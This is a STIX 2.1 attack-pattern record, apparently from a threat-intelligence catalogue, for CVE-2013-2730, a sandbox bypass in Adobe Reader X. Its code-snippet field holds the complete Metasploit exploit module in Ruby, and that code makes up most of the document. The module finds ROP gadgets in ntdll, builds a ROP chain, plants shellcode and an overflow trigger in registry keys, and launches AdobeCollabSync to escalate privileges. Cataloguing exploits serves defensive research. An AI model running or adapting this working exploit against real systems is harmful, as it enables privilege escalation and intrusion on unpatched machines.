{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08589c9b-7ab9-46e7-9ec5-786adfa23399",
    "created": "2024-08-14T16:49:46.467818Z",
    "modified": "2024-08-14T16:49:46.467822Z",
    "name": "AdobeCollabSync Buffer Overflow Adobe Reader X Sandbox Bypass",
    "description": " This module exploits a vulnerability on Adobe Reader X Sandbox. The vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe process to write register values which can be used to trigger a buffer overflow on the AdobeCollabSync component, allowing to achieve Medium Integrity Level privileges from a Low Integrity AcroRd32.exe process. This module has been tested successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/adobe_sandbox_adobecollabsync.rb",
            "external_id": "adobe_sandbox_adobecollabsync.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2730"
        },
        {
            "source_name": "reference",
            "url": "http://blog.binamuse.com/2013/05/adobe-reader-x-collab-sandbox-bypass.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'AdobeCollabSync Buffer Overflow Adobe Reader X Sandbox Bypass',\n          'Description' => %q{\n            This module exploits a vulnerability on Adobe Reader X Sandbox. The\n            vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe\n            process to write register values which can be used to trigger a buffer overflow on\n            the AdobeCollabSync component, allowing to achieve Medium Integrity Level\n            privileges from a Low Integrity AcroRd32.exe process. This module has been tested\n            successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Felipe Andres Manzano', # Vulnerability discovery and PoC\n            'juan vazquez' # Metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2013-2730' ],\n            [ 'OSVDB', '93355' ],\n            [ 'URL', 'http://blog.binamuse.com/2013/05/adobe-reader-x-collab-sandbox-bypass.html' ]\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'Payload' => {\n            'Space' => 12288,\n            'DisableNops' => true\n          },\n          'Targets' => [\n            [\n              'Adobe Reader X 10.1.4 / Windows 7 SP1',\n              {\n                'AdobeCollabSyncTrigger' => 0x18fa0,\n                'AdobeCollabSyncTriggerSignature' => \"\\x56\\x68\\xBC\\x00\\x00\\x00\\xE8\\xF5\\xFD\\xFF\\xFF\"\n              }\n            ],\n          ],\n          'DefaultTarget' => 0,\n          'DisclosureDate' => '2013-05-14',\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_railgun_memread\n                stdapi_sys_config_getenv\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session\n    print_status(\"Deleting Malicious Registry Keys...\")\n    if not registry_deletekey(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\shellcode\")\n      print_error(\"Delete HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\shellcode by yourself\")\n    end\n    if not registry_deletekey(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\bDeleteDB\")\n      print_error(\"Delete HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\bDeleteDB by yourself\")\n    end\n    print_status(\"Cleanup finished\")\n  end\n\n  # Test the process integrity level by trying to create a directory on the TEMP folder\n  # Access should be granted with Medium Integrity Level\n  # Access should be denied with Low Integrity Level\n  # Usint this solution atm because I'm experiencing problems with railgun when trying\n  # use GetTokenInformation\n  def low_integrity_level?\n    tmp_dir = session.sys.config.getenv('TEMP')\n    cd(tmp_dir)\n    new_dir = \"#{rand_text_alpha(5)}\"\n    begin\n      session.shell_command_token(\"mkdir #{new_dir}\")\n    rescue\n      return true\n    end\n\n    if directory?(new_dir)\n      session.shell_command_token(\"rmdir #{new_dir}\")\n      return false\n    else\n      return true\n    end\n  end\n\n  def check_trigger\n    signature = session.railgun.memread(@addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger'], target['AdobeCollabSyncTriggerSignature'].length)\n    if signature == target['AdobeCollabSyncTriggerSignature']\n      return true\n    end\n\n    return false\n  end\n\n  def collect_addresses\n    # find the trigger to launch AdobeCollabSyncTrigger.exe from AcroRd32.exe\n    @addresses['trigger'] = @addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger']\n    vprint_good(\"AdobeCollabSyncTrigger trigger address found at 0x#{@addresses['trigger'].to_s(16)}\")\n\n    # find kernel32.dll\n    kernel32 = session.railgun.kernel32.GetModuleHandleA(\"kernel32.dll\")\n    @addresses['kernel32.dll'] = kernel32[\"return\"]\n    if @addresses['kernel32.dll'] == 0\n      fail_with(Failure::Unknown, \"Unable to find kernel32.dll\")\n    end\n    vprint_good(\"kernel32.dll address found at 0x#{@addresses['kernel32.dll'].to_s(16)}\")\n\n    # find kernel32.dll methods\n    virtual_alloc = session.railgun.kernel32.GetProcAddress(@addresses['kernel32.dll'], \"VirtualAlloc\")\n    @addresses['VirtualAlloc'] = virtual_alloc[\"return\"]\n    if @addresses['VirtualAlloc'] == 0\n      fail_with(Failure::Unknown, \"Unable to find VirtualAlloc\")\n    end\n    vprint_good(\"VirtualAlloc address found at 0x#{@addresses['VirtualAlloc'].to_s(16)}\")\n\n    reg_get_value = session.railgun.kernel32.GetProcAddress(@addresses['kernel32.dll'], \"RegGetValueA\")\n    @addresses['RegGetValueA'] = reg_get_value[\"return\"]\n    if @addresses['RegGetValueA'] == 0\n      fail_with(Failure::Unknown, \"Unable to find RegGetValueA\")\n    end\n    vprint_good(\"RegGetValueA address found at 0x#{@addresses['RegGetValueA'].to_s(16)}\")\n\n    # find ntdll.dll\n    ntdll = session.railgun.kernel32.GetModuleHandleA(\"ntdll.dll\")\n    @addresses['ntdll.dll'] = ntdll[\"return\"]\n    if @addresses['ntdll.dll'] == 0\n      fail_with(Failure::Unknown, \"Unable to find ntdll.dll\")\n    end\n    vprint_good(\"ntdll.dll address found at 0x#{@addresses['ntdll.dll'].to_s(16)}\")\n  end\n\n  # Search a gadget identified by pattern on the process memory\n  def search_gadget(base, offset_start, offset_end, pattern)\n    mem = base + offset_start\n    length = offset_end - offset_start\n    mem_contents = session.railgun.memread(mem, length)\n    return mem_contents.index(pattern)\n  end\n\n  # Search for gadgets on ntdll.dll\n  def search_gadgets\n    ntdll_text_base = 0x10000\n    search_length = 0xd6000\n\n    @gadgets['mov [edi], ecx # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, \"\\x89\\x0f\\xc3\")\n    if @gadgets['mov [edi], ecx # ret'].nil?\n      fail_with(Failure::Unknown, \"Unable to find gadget 'mov [edi], ecx # ret'\")\n    end\n    @gadgets['mov [edi], ecx # ret'] += @addresses['ntdll.dll']\n    @gadgets['mov [edi], ecx # ret'] += ntdll_text_base\n    vprint_good(\"Gadget 'mov [edi], ecx # ret' found at 0x#{@gadgets['mov [edi], ecx # ret'].to_s(16)}\")\n\n    @gadgets['ret'] = @gadgets['mov [edi], ecx # ret'] + 2\n    vprint_good(\"Gadget 'ret' found at 0x#{@gadgets['ret'].to_s(16)}\")\n\n    @gadgets['pop edi # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, \"\\x5f\\xc3\")\n    if @gadgets['pop edi # ret'].nil?\n      fail_with(Failure::Unknown, \"Unable to find gadget 'pop edi # ret'\")\n    end\n    @gadgets['pop edi # ret'] += @addresses['ntdll.dll']\n    @gadgets['pop edi # ret'] += ntdll_text_base\n    vprint_good(\"Gadget 'pop edi # ret' found at 0x#{@gadgets['pop edi # ret'].to_s(16)}\")\n\n    @gadgets['pop ecx # ret'] = search_gadget(@addresses['ntdll.dll'], ntdll_text_base, search_length, \"\\x59\\xc3\")\n    if @gadgets['pop ecx # ret'].nil?\n      fail_with(Failure::Unknown, \"Unable to find gadget 'pop ecx # ret'\")\n    end\n    @gadgets['pop ecx # ret'] += @addresses['ntdll.dll']\n    @gadgets['pop ecx # ret'] += ntdll_text_base\n    vprint_good(\"Gadget 'pop edi # ret' found at 0x#{@gadgets['pop ecx # ret'].to_s(16)}\")\n  end\n\n  def store(buf, data, address)\n    i = 0\n    while (i < data.length)\n      buf << [@gadgets['pop edi # ret']].pack(\"V\")\n      buf << [address + i].pack(\"V\") # edi\n      buf << [@gadgets['pop ecx # ret']].pack(\"V\")\n      buf << data[i, 4].ljust(4, \"\\x00\") # ecx\n      buf << [@gadgets['mov [edi], ecx # ret']].pack(\"V\")\n      i = i + 4\n    end\n    return i\n  end\n\n  def create_rop_chain\n    mem = 0x0c0c0c0c\n\n    buf = [0x58000000 + 1].pack(\"V\")\n    buf << [0x58000000 + 2].pack(\"V\")\n    buf << [0].pack(\"V\")\n    buf << [0x58000000 + 4].pack(\"V\")\n\n    buf << [0x58000000 + 5].pack(\"V\")\n    buf << [0x58000000 + 6].pack(\"V\")\n    buf << [0x58000000 + 7].pack(\"V\")\n    buf << [@gadgets['ret']].pack(\"V\")\n    buf << rand_text(8)\n\n    # Allocate Memory To store the shellcode and the necessary data to read the\n    # shellcode stored in the registry\n    buf << [@addresses['VirtualAlloc']].pack(\"V\")\n    buf << [@gadgets['ret']].pack(\"V\")\n    buf << [mem].pack(\"V\")        # lpAddress\n    buf << [0x00010000].pack(\"V\") # SIZE_T dwSize\n    buf << [0x00003000].pack(\"V\") # DWORD flAllocationType\n    buf << [0x00000040].pack(\"V\") # flProtect\n\n    # Put in the allocated memory the necessary data in order to read the\n    # shellcode stored in the registry\n    # 1) The reg sub key: Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\n    reg_key = \"Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\x00\"\n    reg_key_length = store(buf, reg_key, mem)\n    # 2) The reg entry: shellcode\n    value_key = \"shellcode\\x00\"\n    store(buf, value_key, mem + reg_key_length)\n    # 3) The output buffer size: 0x3000\n    size_buffer = 0x3000\n    buf << [@gadgets['pop edi # ret']].pack(\"V\")\n    buf << [mem + 0x50].pack(\"V\") # edi\n    buf << [@gadgets['pop ecx # ret']].pack(\"V\")\n    buf << [size_buffer].pack(\"V\") # ecx\n    buf << [@gadgets['mov [edi], ecx # ret']].pack(\"V\")\n\n    # Copy the shellcode from the registry to the\n    # memory allocated with executable permissions and\n    # ret into there\n    buf << [@addresses['RegGetValueA']].pack(\"V\")\n    buf << [mem + 0x1000].pack(\"V\") # ret to shellcode\n    buf << [0x80000001].pack(\"V\")   # hkey => HKEY_CURRENT_USER\n    buf << [mem].pack(\"V\")          # lpSubKey\n    buf << [mem + 0x3c].pack(\"V\")   # lpValue\n    buf << [0x0000FFFF].pack(\"V\")   # dwFlags => RRF_RT_ANY\n    buf << [0].pack(\"V\")            # pdwType\n    buf << [mem + 0x1000].pack(\"V\") # pvData\n    buf << [mem + 0x50].pack(\"V\")   # pcbData\n  end\n\n  # Store shellcode and AdobeCollabSync.exe Overflow trigger in the Registry\n  def store_data_registry(buf)\n    vprint_status(\"Creating the Registry Key to store the shellcode...\")\n\n    if registry_createkey(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\shellcode\")\n      vprint_good(\"Registry Key created\")\n    else\n      fail_with(Failure::Unknown, \"Failed to create the Registry Key to store the shellcode\")\n    end\n\n    vprint_status(\"Storing the shellcode in the Registry...\")\n\n    if registry_setvaldata(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\", \"shellcode\", payload.encoded, \"REG_BINARY\")\n      vprint_good(\"Shellcode stored\")\n    else\n      fail_with(Failure::Unknown, \"Failed to store shellcode in the Registry\")\n    end\n\n    # Create the Malicious registry entry in order to exploit....\n    vprint_status(\"Creating the Registry Key to trigger the Overflow...\")\n    if registry_createkey(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\\\\bDeleteDB\")\n      vprint_good(\"Registry Key created\")\n    else\n      fail_with(Failure::Unknown, \"Failed to create the Registry Entry to trigger the Overflow\")\n    end\n\n    vprint_status(\"Storing the trigger in the Registry...\")\n    if registry_setvaldata(\"HKCU\\\\Software\\\\Adobe\\\\Adobe Synchronizer\\\\10.0\\\\DBRecoveryOptions\", \"bDeleteDB\", buf, \"REG_BINARY\")\n      vprint_good(\"Trigger stored\")\n    else\n      fail_with(Failure::Unknown, \"Failed to store the trigger in the Registry\")\n    end\n  end\n\n  def trigger_overflow\n    vprint_status(\"Creating the thread to trigger the Overflow on AdobeCollabSync.exe...\")\n    # Create a thread in order to execute the necessary code to launch AdobeCollabSync\n    ret = session.railgun.kernel32.CreateThread(nil, 0, @addresses['trigger'], nil, \"CREATE_SUSPENDED\", nil)\n    if ret['return'] < 1\n      print_error(\"Unable to CreateThread\")\n      return\n    end\n    hthread = ret['return']\n\n    vprint_status(\"Resuming the Thread...\")\n    # Resume the thread to actually Launch AdobeCollabSync and trigger the vulnerability!\n    ret = client.railgun.kernel32.ResumeThread(hthread)\n    if ret['return'] < 1\n      fail_with(Failure::Unknown, \"Unable to ResumeThread\")\n    end\n  end\n\n  def check\n    @addresses = {}\n    acrord32 = session.railgun.kernel32.GetModuleHandleA(\"AcroRd32.exe\")\n    @addresses['AcroRd32.exe'] = acrord32[\"return\"]\n    if @addresses['AcroRd32.exe'] == 0\n      return Msf::Exploit::CheckCode::Unknown\n    elsif check_trigger\n      return Msf::Exploit::CheckCode::Vulnerable\n    else\n      return Msf::Exploit::CheckCode::Detected\n    end\n  end\n\n  def exploit\n    @addresses = {}\n    @gadgets = {}\n\n    print_status(\"Verifying we're in the correct target process...\")\n    acrord32 = session.railgun.kernel32.GetModuleHandleA(\"AcroRd32.exe\")\n    @addresses['AcroRd32.exe'] = acrord32[\"return\"]\n    if @addresses['AcroRd32.exe'] == 0\n      fail_with(Failure::NoTarget, \"AcroRd32.exe process not found\")\n    end\n    vprint_good(\"AcroRd32.exe found at 0x#{@addresses['AcroRd32.exe'].to_s(16)}\")\n\n    print_status(\"Checking the AcroRd32.exe image...\")\n    if not check_trigger\n      fail_with(Failure::NoTarget, \"Please check the target, the AcroRd32.exe process doesn't match with the target\")\n    end\n\n    print_status(\"Checking the Process Integrity Level...\")\n    if not low_integrity_level?\n      fail_with(Failure::NoTarget, \"Looks like you don't need this Exploit since you're already enjoying Medium Level\")\n    end\n\n    print_status(\"Collecting necessary addresses for exploit...\")\n    collect_addresses\n\n    print_status(\"Searching the gadgets needed to build the ROP chain...\")\n    search_gadgets\n    print_good(\"Gadgets collected...\")\n\n    print_status(\"Building the ROP chain...\")\n    buf = create_rop_chain\n    print_good(\"ROP chain ready...\")\n\n    print_status(\"Storing the shellcode and the trigger in the Registry...\")\n    store_data_registry(buf)\n\n    print_status(\"Executing AdobeCollabSync.exe...\")\n    trigger_overflow\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-14",
    "x_mitre_platforms": [
        "win'"
    ]
}